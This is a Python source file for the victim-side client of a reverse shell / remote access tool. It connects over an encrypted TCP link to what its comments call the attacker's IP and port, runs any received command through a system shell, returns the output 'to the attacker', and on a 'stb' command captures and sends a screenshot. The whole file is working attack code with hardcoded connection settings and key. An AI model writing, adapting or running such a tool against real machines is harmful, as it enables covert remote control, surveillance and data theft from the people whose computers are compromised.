import socket, subprocess, os, encrypted_connection

HOST = "localhost"  # attacker's IP adress (this is a random one, just to show you)
PORT = 6969 # attacker's port on which server is listening

encrypter = encrypted_connection.encrypter(b"d41d8cd98f00b205")
encrypter.initialize_tcp_connexion_client(HOST,PORT)

while True:
    command = ""
    command = encrypter.receive_message_client()
    split_command = command.split()
    print("Received command : " +command)
    if(command.split()[0] == "cd"):
            if len(command.split()) == 1:
                encrypter.send_message_client((os.getcwd()))
            elif len(command.split()) == 2:
                try:
                    os.chdir(command.split()[1])
                    encrypter.send_message_client(("Changed directory to " + os.getcwd()))
                except OSError as winerror:
                    encrypter.send_message_client(("No such directory : " +os.getcwd()))
    elif command == "stb" :
        im = ImageGrab.grab()
        try :
            im.save('pic.png')
            encrypter.send_message_client(("capturing"))
            pic = open("pic.png", "rb")
            picRead = pic.read(4096)
            while picRead != b'':
                encrypter.send_picture_client(picRead)
                picRead = pic.read(4096)
            pic.close()
            #os.remove("pic.png")
            time.sleep(0.5)
            encrypter.send_picture_client(b'completed')
        except:
            encrypter.send_message_client(("permissionsfailed"))

    else:
        # do shell command
        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        # read output
        stdout_value = proc.stdout.read() + proc.stderr.read()
        print(str(stdout_value))
        stdout_value = stdout_value.decode("utf-8")
        # send output to attacker
        print(stdout_value)
        if(stdout_value != ""):
            encrypter.send_message_client(stdout_value)  # renvoit l'output  à l'attaquant
        else:
            encrypter.send_message_client((command+ " does not return anything"))
Quit = False
encrypter.close_tcp_connexion_client()